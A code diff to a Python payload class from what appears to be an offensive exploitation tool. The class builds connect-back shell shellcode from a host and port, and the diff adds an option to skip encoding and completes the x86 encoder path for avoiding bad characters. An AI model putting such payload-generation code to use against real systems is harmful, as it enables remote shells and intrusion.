@@ -8,7 +8,7 @@ import extra_functions.custom_print as custom_print
 
 
 class Payload():
-    def __init__(self, shellcode, size, use_metaploit=False, info_metasploit="", arq="x64", single=False):
+    def __init__(self, shellcode, size, use_metaploit=False, info_metasploit="", arq="x64", single=False, need_encode=True):
         self.shellcode = shellcode
         self.size = size
         self.use_metaploit = use_metaploit
@@ -17,16 +17,15 @@ class Payload():
         self.single = single
         if not single:
             self.options = {
-                "encode": ["Host to connect the shell", False, False],
                 "lhost": ["Host to connect the shell", "", True],
                 "lport": ["Port to connect the shell", "", True],
-                "badchars": ["Bad characters (example \\x00,\\xab)", "\\x00", True]
             }
         else:
-            self.options = {
-                "encode": ["Host to connect the shell", False, False],
-                "badchars": ["Bad characters (example \\x00,\\xab)", "\\x00", True]
-            }
+            self.options = {}
+	# Some payloads don't need encode
+        if need_encode:
+            self.options["encode"] =  ["Host to connect the shell", False, False]
+            self.options["badchars"] =  ["Bad characters (example \\x00,\\xab)", "\\x00", True]
     
     def get_info_metasploit(self):
         if not self.use_metaploit:
@@ -37,7 +36,7 @@ class Payload():
         if not self.single:
             port =self.options["lport"][1]
             host = self.options["lhost"][1]
-            if self.options["encode"][1]:
+            if "encode" in self.options and self.options["encode"][1]:
                 if self.arq == "x64":
                     sh_aux = self.shellcode % (pack(">h",int(port)), inet_aton(host))
                     enc = Encoder64(sh_aux, self.options["badchars"][1])
@@ -45,6 +44,8 @@ class Payload():
                 else:
                     #TODO
                     sh_aux = self.shellcode % (inet_aton(host), pack(">h",int(port)))
+                    enc = Encoder86(sh_aux, self.options["badchars"][1])
+                    sh_aux = enc.execute()
             else:
                 p, h = get_address(port, host)
                 if self.arq == "x64":
@@ -52,13 +53,14 @@ class Payload():
                 else:
                     sh_aux = self.shellcode % (h,p)
         else:
-            if self.options["encode"][1]:
+            if "encode" in self.options and self.options["encode"][1]:
                 if self.arq == "x64":
                     enc = Encoder64(self.shellcode, self.options["badchars"][1])
                     sh_aux = enc.execute()
                 else:
                     #TODO
-                    sh_aux = self.shellcode
+                    enc = Encoder86(self.shellcode, self.options["badchars"][1])
+                    sh_aux = enc.execute()
             else:
                 sh_aux = self.shellcode
             
